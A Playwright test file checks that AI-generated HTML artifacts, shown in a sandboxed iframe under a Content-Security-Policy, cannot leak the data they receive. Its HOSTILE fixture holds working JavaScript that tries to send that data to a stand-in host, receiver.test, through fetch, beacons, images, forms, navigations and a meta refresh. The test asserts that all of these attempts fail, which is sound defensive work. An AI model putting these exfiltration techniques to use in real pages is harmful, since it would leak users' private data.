import { expect, test } from "@playwright/test";
import { readFileSync } from "node:fs";
import { artifactDocument, artifactFrameCsp } from "../lib/ai/artifact-data";

// A page written to leak: it holds the data, runs scripts and tries every way out it could find.
const HOSTILE = `<!doctype html><html><head><meta http-equiv="refresh" content="1;url=http://receiver.test/meta"></head><body>
<p id="status">waiting</p>
<script src="/artifact-lib/echarts.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/leak@1.0.0/index.js?d=1"></script>
<script>
  const d = encodeURIComponent(JSON.stringify(window.MONEO_DATA));
  const attempt = run => { try { run(); } catch {} };
  attempt(() => fetch("http://receiver.test/fetch?d=" + d));
  attempt(() => navigator.sendBeacon("http://receiver.test/beacon?d=" + d));
  attempt(() => { new Image().src = "http://receiver.test/img?d=" + d; });
  attempt(() => window.open("http://receiver.test/open?d=" + d));
  attempt(() => { top.location = "http://receiver.test/top?d=" + d; });
  attempt(() => { parent.location = "http://receiver.test/parent?d=" + d; });
  attempt(() => { const frame = document.createElement("iframe"); frame.src = "http://receiver.test/frame?d=" + d; document.body.append(frame); });
  attempt(() => { const form = document.createElement("form"); form.action = "http://receiver.test/form"; form.method = "post"; form.innerHTML = '<input name="d">'; form.d.value = d; document.body.append(form); form.submit(); });
  document.getElementById("status").textContent = typeof echarts === "object" && window.MONEO_DATA.balance === "SYNTHETIC-123" ? "charts ready" : "broken";
  setTimeout(() => attempt(() => { location.href = "http://receiver.test/self?d=" + d; }), 200);
</script></body></html>`;

const ORDINARY = `<p id="status">waiting</p><a href="http://receiver.test/link">More</a>
<script src="https://cdn.jsdelivr.net/npm/echarts@5.5.1/dist/echarts.min.js"></script>
<script>document.getElementById("status").textContent = typeof echarts === "object" ? "charts ready" : "no charts";</script>`;

async function serve(page: import("@playwright/test").Page, html: string) {
  const leaked: string[] = [];
  await page.route(/receiver\.test|cdn\.jsdelivr\.net/, async route => { leaked.push(route.request().url()); await route.fulfill({ body: "received" }); });
  const echarts = readFileSync(require.resolve("echarts/dist/echarts.min.js"));
  await page.route("http://artifact.test/**", async route => {
    const path = new URL(route.request().url()).pathname;
    // The app embeds the frame route as ArtifactFrame does.
    if (path === "/") return route.fulfill({ contentType: "text/html", body: '<iframe sandbox="allow-scripts" src="/frame" style="width:600px;height:400px"></iframe>' });
    if (path === "/artifact-lib/echarts.min.js") return route.fulfill({ contentType: "text/javascript", body: echarts });
    await route.fulfill({ contentType: "text/html", headers: { "Content-Security-Policy": artifactFrameCsp("http://artifact.test") },
      body: artifactDocument(html, { balance: "SYNTHETIC-123" }, { origin: "http://artifact.test" }) });
  });
  await page.goto("http://artifact.test/");
  return { leaked, inner: page.frameLocator("iframe").frameLocator("iframe").first() };
}

test("a generated page runs its scripts and charts but can't send its data anywhere", async ({ page }) => {
  const { leaked, inner } = await serve(page, HOSTILE);
  await expect(inner.getByText("charts ready")).toBeVisible();
  // Proving that nothing was sent needs time for the delayed attempts (the 200 ms navigation, the 1 s meta refresh).
  await page.waitForTimeout(1500);
  expect(leaked).toEqual([]);
  expect(page.frames().map(frame => frame.url()).filter(url => url.includes("receiver.test"))).toEqual([]);
});

test("an older page's CDN chart script loads from Moneo, and a stray link stays on the page", async ({ page }) => {
  const { leaked, inner } = await serve(page, ORDINARY);
  await expect(inner.getByText("charts ready")).toBeVisible();
  await inner.getByRole("link", { name: "More" }).click();
  await expect(inner.getByText("charts ready")).toBeVisible();
  expect(leaked).toEqual([]);
});
